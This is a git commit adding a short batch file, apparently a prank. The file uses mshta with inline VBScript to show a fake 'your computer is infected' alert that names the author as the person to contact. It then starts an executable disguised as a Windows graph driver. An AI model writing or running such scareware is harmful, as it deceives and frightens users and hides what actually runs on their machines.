f6f0a67e265c5d8306e5089980da59a196470a36
Vadymkon <66555755+Vadymkon@users.noreply.github.com>
2023-07-14 18:58:47 +0300

    Add files via upload

---
+++ WindDopp (НЕ ИНСТРУКЦИИ)/Skibidi.bat
@@ -0,0 +1,3 @@
+mshta vbscript:Execute("msgbox ""Vash kompyuter byl zarazhen ShKIBIDI DOP DOP DOP Virusom. Dlya resheniya problemy, obratites k Vadymkon."":close") & timeout 60
+start "" "%programfiles%/Windows Doppler Drives/Windows_Graph_Driver.exe"
+exit
